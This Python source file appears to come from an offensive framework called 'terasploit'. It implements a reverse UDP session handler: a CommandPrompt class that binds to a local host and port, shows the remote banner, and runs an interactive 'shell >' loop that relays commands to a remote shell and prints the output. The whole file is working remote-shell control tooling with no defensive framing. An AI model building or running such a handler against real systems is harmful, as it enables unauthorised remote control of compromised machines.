#######
# Session: Reverse UDP
#######

from libs.terasploit.framework.clients.utils.decoder import Decode
from libs.terasploit.framework.clients.udp.udp_client import UDPClient

import sys
import os
import time
import logging

from init.tsf.ui.wildcard import info_print, s

logger = logging.getLogger()

class CommandPrompt:
    def __init__(self, lhost: str = '', lport: int = 80) -> None:
        self.lhost = lhost
        self.lport = lport
        self.client = None
        self.connect()
        
        
    def connect(self):
        client = UDPClient.Bind(self.lhost,self.lport)
        if not client:
            info_print ("Reverse UDP session failed to start.")
            return
        if client:
            self.client = client
            
        content = Decode.content(self.client)
        info_print (content)
        self.prompt()
        
        
    def output(self,content) -> None:
        sys.stdout.write(content)
        sys.stdout.write("\b\r")
        sys.stdout.write(' '*80)
        sys.stdout.flush()
       
        
    def prompt(self) -> None:
        while True:
            try:
                sys.stdout.write('\r')
                sys.stdout.flush()
                user = input(f'{s.UNDERLINE}shell{s.RESET_ALL} > ')
                if user.lower() == 'clear' or user.lower() == 'cls':
                    os.system('clear')
                    continue
                if user.lower() == 'exit':
                    self.client.close()
                    logger.info('UDP bind connection closed.')
                    logger.info('ReverseUDP session complete.')
                    break
                
                command = user + '\n'
                self.client.send(command.encode())
                time.sleep(1)
                
                content = Decode.content(self.client)
                self.output(content)
            except KeyboardInterrupt:
                pass
            except Exception as error:
                info_print (error,type='red')